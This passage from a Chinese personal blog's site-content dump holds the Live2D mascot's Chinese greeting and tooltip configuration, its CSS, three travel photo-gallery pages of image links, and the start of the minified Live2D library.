[\"该怎么称呼你呢？\", \"留下你的尊姓大名！\"]\n\t}, {\n\t\t\"selector\": \".vmail\",\n\t\t\"text\": [\"留下你的邮箱，不然就是无头像人士了！\", \"记得设置好 Gravatar 头像哦！\", \"为了方便通知你最新消息，一定要留下邮箱！\"]\n\t}, {\n\t\t\"selector\": \".vlink\",\n\t\t\"text\": [\"快快告诉我你的家在哪里，好让我去参观参观！\"]\n\t}, {\n\t\t\"selector\": \".veditor\",\n\t\t\"text\": [\"想要去评论些什么吗？\", \"要说点什么吗？\", \"觉得博客不错？快来留言和主人交流吧！\"]\n\t}, {\n\t\t\"selector\": \".vcontrol a\",\n\t\t\"text\": [\"你会不会熟练使用 Markdown 呀？\", \"使用 Markdown 让评论更美观吧～\"]\n\t}, {\n\t\t\"selector\": \".vemoji-btn\",\n\t\t\"text\": [\"要插入一个萌萌哒的表情吗？\", \"要来一发表情吗？\"]\n\t}, {\n\t\t\"selector\": \".vpreview-btn\",\n\t\t\"text\": [\"要预览一下你的发言吗？\", \"快看看你的评论有多少负熵！\"]\n\t}, {\n\t\t\"selector\": \".vsubmit\",\n\t\t\"text\": [\"评论没有审核，要对自己的发言负责哦～\", \"要提交了吗，请耐心等待回复哦～\"]\n\t}, {\n\t\t\"selector\": \".vcontent\",\n\t\t\"text\": [\"哇，快看看这个精彩评论！\", \"如果有疑问，请尽快留言哦～\"]\n\t}],\n\t\"click\": [{\n\t\t\"selector\": \"#live2d\",\n\t\t\"text\": [\"是…是不小心碰到了吧…\", \"萝莉控是什么呀？\", \"你看到我的小熊了吗？\", \"再摸的话我可要报警了！⌇●﹏●⌇\", \"110 吗，这里有个变态一直在摸我(ó﹏ò｡)\", \"不要摸我了，我会告诉老婆来打你的！\", \"干嘛动我呀！小心我咬你！\", \"别摸我，有什么好摸的！\"]\n\t}, {\n\t\t\"selector\": \".veditor\",\n\t\t\"text\": [\"要吐槽些什么呢？\", \"一定要认真填写喵～\", \"有什么想说的吗？\"]\n\t}, {\n\t\t\"selector\": \".vsubmit\",\n\t\t\"text\": [\"输入验证码就可以提交评论啦～\"]\n\t}],\n\t\"seasons\": [{\n\t\t\"date\": \"01/01\",\n\t\t\"text\": \"<span>元旦</span>了呢，新的一年又开始了，今年是{year}年～\"\n\t}, {\n\t\t\"date\": \"02/14\",\n\t\t\"text\": \"又是一年<span>情人节</span>，{year}年找到对象了嘛～\"\n\t}, {\n\t\t\"date\": \"03/08\",\n\t\t\"text\": \"今天是<span>国际妇女节</span>！\"\n\t}, {\n\t\t\"date\": \"03/12\",\n\t\t\"text\": \"今天是<span>植树节</span>，要保护环境呀！\"\n\t}, {\n\t\t\"date\": \"04/01\",\n\t\t\"text\": \"悄悄告诉你一个秘密～<span>今天是愚人节，不要被骗了哦～</span>\"\n\t}, {\n\t\t\"date\": \"05/01\",\n\t\t\"text\": \"今天是<span>五一劳动节</span>，计划好假期去哪里了吗～\"\n\t}, {\n\t\t\"date\": \"06/01\",\n\t\t\"text\": \"<span>儿童节</span>了呢，快活的时光总是短暂，要是永远长不大该多好啊…\"\n\t}, {\n\t\t\"date\": \"09/03\",\n\t\t\"text\": \"<span>中国人民抗日战争胜利纪念日</span>，铭记历史、缅怀先烈、珍爱和平、开创未来。\"\n\t}, {\n\t\t\"date\": \"09/10\",\n\t\t\"text\": \"<span>教师节</span>，在学校要给老师问声好呀～\"\n\t}, {\n\t\t\"date\": \"10/01\",\n\t\t\"text\": \"<span>国庆节</span>到了，为祖国母亲庆生！\"\n\t}, {\n\t\t\"date\": \"11/05-11/12\",\n\t\t\"text\": \"今年的<span>双十一</span>是和谁一起过的呢～\"\n\t}, {\n\t\t\"date\": \"12/20-12/31\",\n\t\t\"text\": \"这几天是<span>圣诞节</span>，主人肯定又去剁手买买买了～\"\n\t}],\n\t\"time\": [{\n\t\t\"hour\": \"6-7\",\n\t\t\"text\": \"早上好！一日之计在于晨，美好的一天就要开始了～\"\n\t}, {\n\t\t\"hour\": \"8-11\",\n\t\t\"text\": \"上午好！工作顺利嘛，不要久坐，多起来走动走动哦！\"\n\t}, {\n\t\t\"hour\": \"12-13\",\n\t\t\"text\": \"中午了，工作了一个上午，现在是午餐时间！\"\n\t}, {\n\t\t\"hour\": \"14-17\",\n\t\t\"text\": \"午后很容易犯困呢，今天的运动目标完成了吗？\"\n\t}, {\n\t\t\"hour\": \"18-19\",\n\t\t\"text\": \"傍晚了！窗外夕阳的景色很美丽呢，最美不过夕阳红～\"\n\t}, {\n\t\t\"hour\": \"20-21\",\n\t\t\"text\": \"晚上好，今天过得怎么样？\"\n\t}, {\n\t\t\"hour\": \"22-23\",\n\t\t\"text\": [\"已经这么晚了呀，早点休息吧，晚安～\", \"深夜时要爱护眼睛呀！\"]\n\t}, {\n\t\t\"hour\": \"0-5\",\n\t\t\"text\": \"你是夜猫子呀？这么晚还不睡觉，明天起的来嘛？\"\n\t}],\n\t\"message\": {\n\t\t\"default\": [\"好久不见，日子过得好快呢……\", \"大坏蛋！你都多久没理人家了呀，嘤嘤嘤～\", \"嗨～快来逗我玩吧！\", \"拿小拳拳锤你胸口！\", \"记得把小家加入收藏夹哦！\"],\n\t\t\"console\": \"哈哈，你打开了控制台，是想要看看我的小秘密吗？\",\n\t\t\"copy\": \"你都复制了些什么呀，转载要记得加上出处哦！\",\n\t\t\"visibilitychange\": \"哇，你终于回来了～\"\n\t}\n}\n"},{"url":"/plugins/live2d/waifu.css","content":"#waifu-toggle {\n\tbackground-color: #fa0;\n\tborder-radius: 5px;\n\tbottom: 66px;\n\tcolor: #fff;\n\tcursor: pointer;\n\tfont-size: 12px;\n\tleft: 0;\n\tmargin-left: -100px;\n\tpadding: 5px 2px 5px 5px;\n\tposition: fixed;\n\ttransition: margin-left 1s;\n\twidth: 60px;\n\twriting-mode: vertical-rl;\n}\n\n#waifu-toggle.waifu-toggle-active {\n\tmargin-left: -50px;\n}\n\n#waifu-toggle.waifu-toggle-active:hover {\n\tmargin-left: -30px;\n}\n\n#waifu {\n\tbottom: -1000px;\n\tright: 60px;\n\tline-height: 0;\n\tmargin-bottom: -10px;\n\tposition: fixed;\n\ttransform: translateY(3px);\n\ttransition: transform .3s ease-in-out, bottom 3s ease-in-out;\n\tz-index: 1;\n}\n\n#waifu:hover {\n\ttransform: translateY(0);\n}\n\n#waifu-tips {\n\tanimation: shake 50s ease-in-out 5s infinite;\n\tbackground-color: rgba(236, 217, 188, .5);\n\tborder: 1px solid rgba(224, 186, 140, .62);\n\tborder-radius: 12px;\n\tbox-shadow: 0 3px 15px 2px rgba(191, 158, 118, .2);\n\tfont-size: 14px;\n\tline-height: 24px;\n\tmargin: -30px 20px;\n\tmin-height: 70px;\n\topacity: 0;\n\toverflow: hidden;\n\tpadding: 5px 10px;\n\tposition: absolute;\n\ttext-overflow: ellipsis;\n\ttransition: opacity 1s;\n\twidth: 250px;\n\tword-break: break-all;\n}\n\n#waifu-tips.waifu-tips-active {\n\topacity: 1;\n\ttransition: opacity .2s;\n}\n\n#waifu-tips span {\n\tcolor: #0099cc;\n}\n\n#live2d {\n\tcursor: grab;\n\theight: 300px;\n\tposition: relative;\n\twidth: 300px;\n}\n\n#live2d:active {\n\tcursor: grabbing;\n}\n\n#waifu-tool {\n\tcolor: #aaa;\n\topacity: 0;\n\tposition: absolute;\n\tright: -10px;\n\ttop: 70px;\n\ttransition: opacity 1s;\n}\n\n#waifu:hover #waifu-tool {\n\topacity: 1;\n}\n\n#waifu-tool span {\n\tdisplay: block;\n\theight: 30px;\n\ttext-align: center;\n}\n\n#waifu-tool svg {\n\tfill: #7b8c9d;\n\tcursor: pointer;\n\theight: 25px;\n\ttransition: fill .3s;\n}\n\n#waifu-tool svg:hover {\n\tfill: #0684bd; /* #34495e */\n}\n\n@keyframes shake {\n\t2% {\n\t\ttransform: translate(.5px, -1.5px) rotate(-.5deg);\n\t}\n\n\t4% {\n\t\ttransform: translate(.5px, 1.5px) rotate(1.5deg);\n\t}\n\n\t6% {\n\t\ttransform: translate(1.5px, 1.5px) rotate(1.5deg);\n\t}\n\n\t8% {\n\t\ttransform: translate(2.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t10% {\n\t\ttransform: translate(.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t12% {\n\t\ttransform: translate(1.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t14% {\n\t\ttransform: translate(.5px, .5px) rotate(.5deg);\n\t}\n\n\t16% {\n\t\ttransform: translate(-1.5px, -.5px) rotate(1.5deg);\n\t}\n\n\t18% {\n\t\ttransform: translate(.5px, .5px) rotate(1.5deg);\n\t}\n\n\t20% {\n\t\ttransform: translate(2.5px, 2.5px) rotate(1.5deg);\n\t}\n\n\t22% {\n\t\ttransform: translate(.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t24% {\n\t\ttransform: translate(-1.5px, 1.5px) rotate(-.5deg);\n\t}\n\n\t26% {\n\t\ttransform: translate(1.5px, .5px) rotate(1.5deg);\n\t}\n\n\t28% {\n\t\ttransform: translate(-.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t30% {\n\t\ttransform: translate(1.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t32% {\n\t\ttransform: translate(2.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t34% {\n\t\ttransform: translate(2.5px, 2.5px) rotate(-.5deg);\n\t}\n\n\t36% {\n\t\ttransform: translate(.5px, -1.5px) rotate(.5deg);\n\t}\n\n\t38% {\n\t\ttransform: translate(2.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t40% {\n\t\ttransform: translate(-.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t42% {\n\t\ttransform: translate(-1.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t44% {\n\t\ttransform: translate(-1.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t46% {\n\t\ttransform: translate(1.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t48% {\n\t\ttransform: translate(2.5px, -.5px) rotate(.5deg);\n\t}\n\n\t50% {\n\t\ttransform: translate(-1.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t52% {\n\t\ttransform: translate(-.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t54% {\n\t\ttransform: translate(-1.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t56% {\n\t\ttransform: translate(.5px, 2.5px) rotate(1.5deg);\n\t}\n\n\t58% {\n\t\ttransform: translate(2.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t60% {\n\t\ttransform: translate(2.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t62% {\n\t\ttransform: translate(-1.5px, .5px) rotate(1.5deg);\n\t}\n\n\t64% {\n\t\ttransform: translate(-1.5px, 1.5px) rotate(1.5deg);\n\t}\n\n\t66% {\n\t\ttransform: translate(.5px, 2.5px) rotate(1.5deg);\n\t}\n\n\t68% {\n\t\ttransform: translate(2.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t70% {\n\t\ttransform: translate(2.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t72% {\n\t\ttransform: translate(-.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t74% {\n\t\ttransform: translate(-1.5px, 2.5px) rotate(1.5deg);\n\t}\n\n\t76% {\n\t\ttransform: translate(-1.5px, 2.5px) rotate(1.5deg);\n\t}\n\n\t78% {\n\t\ttransform: translate(-1.5px, 2.5px) rotate(.5deg);\n\t}\n\n\t80% {\n\t\ttransform: translate(-1.5px, .5px) rotate(-.5deg);\n\t}\n\n\t82% {\n\t\ttransform: translate(-1.5px, .5px) rotate(-.5deg);\n\t}\n\n\t84% {\n\t\ttransform: translate(-.5px, .5px) rotate(1.5deg);\n\t}\n\n\t86% {\n\t\ttransform: translate(2.5px, 1.5px) rotate(.5deg);\n\t}\n\n\t88% {\n\t\ttransform: translate(-1.5px, .5px) rotate(1.5deg);\n\t}\n\n\t90% {\n\t\ttransform: translate(-1.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t92% {\n\t\ttransform: translate(-1.5px, -1.5px) rotate(1.5deg);\n\t}\n\n\t94% {\n\t\ttransform: translate(.5px, .5px) rotate(-.5deg);\n\t}\n\n\t96% {\n\t\ttransform: translate(2.5px, -.5px) rotate(-.5deg);\n\t}\n\n\t98% {\n\t\ttransform: translate(-1.5px, -1.5px) rotate(-.5deg);\n\t}\n\n\t0%, 100% {\n\t\ttransform: translate(0, 0) rotate(0);\n\t}\n}\n"},{"title":"长沙","url":"/gallery/travel/changsha/index.html","content":"\n{% gallery %}\n![](https://oss.fyz666.xyz/blogfiles/webp/9b88a94641804b9a1a191438f0927886.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/522be1cfad7c4835813cba159738cb58.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/a8bdef0f4c43010d2b8eb10526428bb8.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/1ddae16e3e21ac15ef392cb858cff87f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/d0659f8da19d5c1b0f4c3c4c25d63a1c.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/3d590154559cdaa155334274d978bd07.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/7bc8070872e58a34f5f9388db2f0c8c6.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/9b3d2e4457a03516b99d726e7de1bad0.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/7490723b38e7276dda274d56405e9adf.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/4bead9ba92b9dfaa3bbfc55a4700ae43.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/402618e63a45c96e45b6f55a0f4575c6.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/e795e9e84b50bce41c93ffc413764e64.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/e65d2234e1d074f6fb6409f26da2c79b.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/7dbd2975ab87ed5d9d20cf872981800a.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/7107b5367d34f440f6f60aded6c6f2cb.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/df4723201d6fec1e3b033aee4392ed42.webp)\n{% endgallery %}\n\n{% btn 'javascript:window.history.go(-1);',返回,far fa-hand-point-left,outline blue larger %}\n"},{"title":"广东","url":"/gallery/travel/guangdong/index.html","content":"\n{% gallery %}\n![](https://oss.fyz666.xyz/blogfiles/webp/f0ff77ef714663056bc4aae8159898b4.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/d5d62914800d45a42446efde0dcd18be.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/0cadd5c0a018348a5c317a09d4b7544b.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/a4085b4e0206fbe5ddd544a908d9ae50.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/fdd2c74ebb73615e241d361542f47a01.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/0de55971715947d8e8b26afc42271812.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/9d4750ad9c198f1b5b7d4c7d2bebacaa.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/2e792310378ccc48b9bca83646b3ae7a.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/ba3752c1e367f9f47bbfa4726f333ee1.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/5a1475faac2e1884daebadb0ce26f1f3.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/a5b96eceb35304f0fe54ef57f13413e3.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/69764164c0721662c200adac7ffb2cde.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/80f83de1272b65e2e6f58c3d2e0ac929.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/caa306816d44f3e39c3cd322c12bd1ef.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/593ef64525a35a9bc2ff3e1c9f1a5d68.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/9346382a3a68c63f7ad162da844f205d.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/0ddd5215d4fa1d5759db2fbdc7ab67c9.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/8d7bb833a2d691e056a3b00284104291.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/4520cf3ec73f5e473c8500c6000748dc.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/6636e12eed72eb353d763d9cf25f0200.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/f11d0596bd63f3a26d1f2e79a22d191f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/c423f17c44d53a9b6eb48fc83f093a60.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/50835c686b28c89ea72fd86fb210562d.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/03cbfc92e75a5a37c28fb7f8cfc2ca4f.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/580e843f04c42c7c8753ae6e0b30dd1c.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/c5ee9019e51d494d426aeb592d9c5e17.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/794274608a503aae09a2e13030174404.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/aad3b126172837023e4b71d772e21d38.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/43da74d2454d81c4dbdb11ffb53665f3.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/21065f0c4ea6b171abe24372aee18395.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/c1349a2b0b8c1f8ce8a8038702956d24.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/8178908d8d6dd766927ca7c6884b1850.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/051fd89ca49947d527a493667ec7e420.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/edc123dbd69ac6d12735e3af5ff5cf23.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/446bf7daa85c98a71f53e74816805688.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/f9209911dae1d555d909d8db3df483d1.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/adea3897fc654751d3fbb85512a5ed50.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/775d16c7607107052c05a2f4c75ef43d.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/4e6f46c4ef1671fe3c3a75c41bfdfe90.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/caeaa4457b24366a4bfc9c9df112c174.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/18f06da0682316378fef7c27226c88e6.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/b94fc1a03e6c9f0fbba2b657b25fa69d.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/8811a3e5e8e7ea799a5c5f5d07eb8c4c.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/8a4bd1f75bbb13a59e0dc1c70f74571f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/52776aca377873c6b87d406b128fb9ab.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/688fb1f9b4ab7ecd3b59384c5278bc50.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/9465018ce37fad2857daa0f479a2c3dd.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/4995eebb44209d59a8e1b9730c67ef4f.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/58ba8e6b1ace858da25eb3ca0b678720.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/8b1431018bacc12335454dcdb3300094.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/54e1f3cd570e23383e7b1098717720f5.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/3babcef0bbfee4ac53942803f5df075b.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/b6ce9beea2743aa47b195e57319ca368.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/87c4bfc62ed0fad1920b603c7aa051dd.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/576cf8bfea6a6a3a2ca7413673d5f590.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/1626103e262322eff20acae4e53bec53.webp)\n{% endgallery %}\n\n{% btn 'javascript:window.history.go(-1);',返回,far fa-hand-point-left,outline blue larger %}\n"},{"title":"黄山","url":"/gallery/travel/huangshan/index.html","content":"\n{% gallery %}\n![](https://oss.fyz666.xyz/blogfiles/jpeg/123df70dd656c7b632f40cb3c5d44f94.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/bb813f9d7a507264e7e0007201183bb9.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/a5fde0ae3e4da0cf9f1e85ceae56f990.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/7ea80f06b0787c972cdb1698634947b7.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/c2c8bb2ea759bffd5ba1555c803787bc.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpg/2869ae63b536798cb3caaf1ebc10ca07.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/5354b6c82c886d38c348ecd9241aad44.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/d389de519f16c75b285d4ceb6be67730.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/8ffc2a922e88ebaefc28021a9df9fec6.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/6b8d0900cfc6c0018fe6c8b672cbe071.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/f9457d1c382d4e9bd0cde3aee3cb2244.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/b34a85da93d96e36b996ffb5a7d6f01b.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/bfe64f200b96f5da15ec6919b3929de0.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/fc359c6a01241ef9e8e3ac31e3144bac.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/28269b6c580e3383105a5c324ad46733.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/f5893d910ca5026e03f085879c176ffc.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/f49d0708151d3a5b0b2abfba911d385c.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpg/363a8dddff5e80b07a3ace525c247f30.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/38c8a23df3c97e71f00e46f50edd8505.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/ff592bd49130b3e8478c21f9315b94dc.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/a7c7c12601e090c506a35a6e19b70bd9.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/29e04445272761e2bb56f8c5eb8cefe0.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/96cc266b3fe3acdc8bc63e7cb185f24d.JPG)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/a7403110de2f3b80852006c5263380ea.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/889e58dcbc2a206fe6a19b91d1944cdf.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/e43ce95a1c2bd929f41e38ab3dc3ab3e.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpg/7946ab8998a8cc9ec1271fe5cc38c000.jpg)\n![](https://oss.fyz666.xyz/blogfiles/webp/d60482a2d5f7af9ce5408c81ced74731.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/101c8f0e9a59c25f2cfa53ce45fc13d3.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpg/0ee92dfaa64a0d5fd5aedd4b81c15b6a.jpg)\n![](https://oss.fyz666.xyz/blogfiles/webp/e28a362d0c979b7f3c61bb0c482aeac6.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/df3ef70b71fb5424912a32f2a96cefa1.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/76cae1224fcf83ec61c58a804efdd697.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/b6e67b7680536a3aedd0a5c70874e04c.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/5bb85935356585d8f2c726348e6ef2be.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpg/967b67fbb2afc29a5a5133cc65353f3a.jpg)\n{% endgallery %}\n\n{% btn 'javascript:window.history.go(-1);',返回,far fa-hand-point-left,outline blue larger %}\n"},{"url":"/plugins/live2d/live2d.min.js","content":"!function(t){function i(r){if(e[r])return e[r].exports;var o=e[r]={i:r,l:!1,exports:{}};return t[r].call(o.exports,o,o.exports,i),o.l=!0,o.exports}var e={};i.m=t,i.c=e,i.d=function(t,e,r){i.o(t,e)||Object.defineProperty(t,e,{configurable:!1,enumerable:!0,get:r})},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,\"a\",e),e},i.o=function(t,i){return Object.prototype.hasOwnProperty.call(t,i)},i.p=\"\",i(i.s=4)}([function(t,i,e){\"use strict\";function r(){this.live2DModel=null,this.modelMatrix=null,this.eyeBlink=null,this.physics=null,this.pose=null,this.debugMode=!1,this.initialized=!1,this.updating=!1,this.alpha=1,this.accAlpha=0,this.lipSync=!1,this.lipSyncValue=0,this.accelX=0,this.accelY=0,this.accelZ=0,this.dragX=0,this.dragY=0,this.startTimeMSec=null,this.mainMotionManager=new h,this.expressionManager=new h,this.motions={},this.expressions={},this.isTexLoaded=!1}function o(){AMotion.prototype.constructor.call(this),this.paramList=new Array}function n(){this.id=\"\",this.type=-1,this.value=null}function s(){this.nextBlinkTime=null,this.stateStartTime=null,this.blinkIntervalMsec=null,this.eyeState=g.STATE_FIRST,this.blinkIntervalMsec=4e3,this.closingMotionMsec=100,this.closedMotionMsec=50,this.openingMotionMsec=150,this.closeIfZero=!0,this.eyeID_L=\"PARAM_EYE_L_OPEN\",this.eyeID_R=\"PARAM_EYE_R_OPEN\"}function _(){this.tr=new Float32Array(16),this.identity()}function a(t,i){_.prototype.constructor.call(this),this.width=t,this.height=i}function h(){MotionQueueManager.prototype.constructor.call(this),this.currentPriority=null,this.reservePriority=null,this.super=MotionQueueManager.prototype}function l(){this.physicsList=new Array,this.startTimeMSec=UtSystem.getUserTimeMSec()}function $(){this.lastTime=0,this.lastModel=null,this.partsGroups=new Array}function u(t){this.paramIndex=-1,this.partsIndex=-1,this.link=null,this.id=t}function p(){this.EPSILON=.01,this.faceTargetX=0,this.faceTargetY=0,this.faceX=0,this.faceY=0,this.faceVX=0,this.faceVY=0,this.lastTimeSec=0}function f(){_.prototype.constructor.call(this),this.screenLeft=null,this.screenRight=null,this.screenTop=null,this.screenBottom=null,this.maxLeft=null,this.maxRight=null,this.maxTop=null,this.maxBottom=null,this.max=Number.MAX_VALUE,this.min=0}function c(){}var d=0;r.prototype.getModelMatrix=function(){return this.modelMatrix},r.prototype.setAlpha=function(t){t>.999&&(t=1),t<.001&&(t=0),this.alpha=t},r.prototype.getAlpha=function(){return this.alpha},r.prototype.isInitialized=function(){return this.initialized},r.prototype.setInitialized=function(t){this.initialized=t},r.prototype.isUpdating=function(){return this.updating},r.prototype.setUpdating=function(t){this.updating=t},r.prototype.getLive2DModel=function(){return this.live2DModel},r.prototype.setLipSync=function(t){this.lipSync=t},r.prototype.setLipSyncValue=function(t){this.lipSyncValue=t},r.prototype.setAccel=function(t,i,e){this.accelX=t,this.accelY=i,this.accelZ=e},r.prototype.setDrag=function(t,i){this.dragX=t,this.dragY=i},r.prototype.getMainMotionManager=function(){return this.mainMotionManager},r.prototype.getExpressionManager=function(){return this.expressionManager},r.prototype.loadModelData=function(t,i){var e=c.getPlatformManager();this.debugMode&&e.log(\"Load model : \"+t);var r=this;e.loadLive2DModel(t,function(t){if(r.live2DModel=t,r.live2DModel.saveParam(),0!=Live2D.getError())return void console.error(\"Error : Failed to loadModelData().\");r.modelMatrix=new a(r.live2DModel.getCanvasWidth(),r.live2DModel.getCanvasHeight()),r.modelMatrix.setWidth(2),r.modelMatrix.setCenterPosition(0,0),i(r.live2DModel)})},r.prototype.loadTexture=function(t,i,e){d++;var r=c.getPlatformManager();this.debugMode&&r.log(\"Load Texture : \"+i);var o=this;r.loadTexture(this.live2DModel,t,i,function(){d--,0==d&&(o.isTexLoaded=!0),\"function\"==typeof e&&e()})},r.prototype.loadMotion=function(t,i,e){var r=c.getPlatformManager();this.debugMode&&r.log(\"Load Motion : \"+i);var o=null,n=this;r.loadBytes(i,function(i){o=Live2DMotion.loadMotion(i),null!=t&&(n.motions[t]=o),e(o)})},r.prototype.loadExpression=function(t,i,e){var r=c.getPlatformManager();this.debugMode&&r.log(\"Load Expression : \"+i);var n=this;r.loadBytes(i,function(i){null!=t&&(n.expressions[t]=o.loadJson(i)),\"function\"==typeof e&&e()})},r.prototype.loadPose=function(t,i){var e=c.getPlatformManager();this.debugMode&&e.log(\"Load Pose : \"+t);var r=this;try{e.loadBytes(t,function(t){r.pose=$.load(t),\"function\"==typeof i&&i()})}catch(t){console.warn(t)}},r.prototype.loadPhysics=function(t){var i=c.getPlatformManager();this.debugMode&&i.log(\"Load Physics : \"+t);var e=this;try{i.loadBytes(t,function(t){e.physics=l.load(t)})}catch(t){console.warn(t)}},r.prototype.hitTestSimple=function(t,i,e){if(null===this.live2DModel)return!1;var r=this.live2DModel.getDrawDataIndex(t);if(r<0)return!1;for(var o=this.live2DModel.getTransformedPoints(r),n=this.live2DModel.getCanvasWidth(),s=0,_=this.live2DModel.getCanvasHeight(),a=0,h=0;h<o.length;h+=2){var 